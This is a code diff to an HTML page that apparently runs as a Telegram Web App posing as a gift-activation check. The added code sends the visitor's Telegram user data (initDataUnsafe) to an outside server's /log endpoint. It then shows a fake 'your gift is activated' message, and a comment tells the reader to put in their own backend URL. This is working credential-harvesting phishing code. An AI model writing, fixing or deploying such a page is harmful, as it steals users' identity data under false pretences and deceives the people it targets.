@@ -23,12 +23,15 @@
             user: tg.initDataUnsafe
         };
 
-        // ОТПРАВКА ДАННЫХ: Замени URL ниже на ссылку своего бэкенда
-     fetch('https://gift-backend-pq6k.onrender.com', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify(data)
-        });
-    </script>
-</body>
-</html>
+    // Исправленная строка (добавлен /log)
+fetch('https://gift-backend-pq6k.onrender.com/log', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify(data)
+})
+.then(response => {
+    if (response.ok) {
+        // Если данные ушли, можно остановить загрузку на экране
+        document.body.innerHTML = "<h1>Проверка завершена! Ваш подарок активирован.</h1>";
+    }
+});
